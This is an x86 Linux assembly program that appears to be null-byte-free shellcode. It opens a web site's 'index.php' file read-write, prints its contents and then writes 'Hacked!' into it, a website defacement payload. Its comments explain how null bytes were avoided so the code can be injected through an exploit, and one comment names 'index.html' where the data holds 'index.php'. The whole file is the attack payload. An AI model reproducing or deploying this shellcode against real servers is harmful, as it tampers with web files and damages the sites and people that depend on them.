global _start               ; global entry point export for ld

section .text

_start:

    ; sys_open(filename, file access mode, file permissions)

    xor     eax, eax
    add     al, 0x5         ; sys_open syscall number
    mov     ebx, filename   ; address of "index.html"
    xor     ecx, ecx
    add     cl, 0x2         ; read and write access
    xor     edx, edx
    int     0x80            ; trap into kernel - the file descriptor will be stored in eax

    ; sys_read(fd, message, length)

    xor     ebx, ebx
    mov     ebx, eax        ; load file descriptor into ebx
    xor     eax, eax
    add     al, 0x3
    mov     ecx, info
    mov     edx, 1024
    int     0x80

    ; sys_write(stdout, message, length)

    xor     edi, edi
    mov     edi, ebx
    xor     eax, eax
    mov     al, 0x4         ; sys_write
    xor     ebx, ebx          
    inc     ebx             ; stdout, mov ebx, 0x1 gave hexcode with null in it
    int     0x80

    ; sys_write(fd, message, length)

    xor     ebx, ebx
    mov     ebx, edi        ; load file descriptor into ebx
    xor     eax, eax         
    add     al, 0x4         ; sys_write
    mov     ecx, message    ; message address
    xor     edx, edx
    mov     edx, m_len      ; message string length
    int     0x80

    ; sys_close(fd)

    xor     eax, eax
    add     eax, 0x6        ; close file
    int     0x80


    ; sys_exit(return_code)
  
    xor     eax, eax
    mov     al, 0x1         ; sys_exit
    int     0x80

section .data

    filename db 'index.php', 0x0
    message db 'Hacked!', 0xd, 0xa
    m_len equ $-message

section .bss

    info resb 1024
